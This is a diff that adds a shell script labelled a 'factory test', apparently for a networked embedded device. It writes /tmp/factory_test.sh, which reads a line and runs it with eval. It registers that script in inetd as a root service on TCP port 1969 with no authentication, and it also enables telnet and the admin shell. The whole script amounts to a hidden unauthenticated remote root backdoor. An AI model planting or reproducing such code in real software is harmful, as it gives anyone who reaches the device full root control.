@@ -1,0 +1,35 @@
+#!/bin/sh
+echo "Initiating factory test ..."
+mount -t tmpfs -o size=4M tmpfs /etc/config
+echo '#!/bin/sh'  > /tmp/factory_test.sh
+echo 'read cmd'  >> /tmp/factory_test.sh
+echo 'eval $cmd' >> /tmp/factory_test.sh
+echo 'exit 0'    >> /tmp/factory_test.sh
+chmod 755 /tmp/factory_test.sh
+echo "1969 stream tcp nowait root /tmp/factory_test.sh" > /etc/inetd.conf
+echo "23 stream tcp nowait root /bin/telnetd" >> /etc/inetd.conf
+cat > /etc/config/accns.json <<!EOF
+{
+    "auth": {
+        "group": {
+            "admin": {
+                "acl": {
+                    "admin": {
+                        "enable": false
+                    },
+                    "shell": {
+                        "enable": true
+                    }
+                }
+            }
+        }
+    }
+}
+!EOF
+/etc/action.d/pam start
+echo '#!/bin/sh'  > /etc/config/start
+echo 'exit 0'    >> /etc/config/start
+chmod 555 /etc/config/start
+ifconfig eth0 192.168.0.1
+inetd &
+exit 0
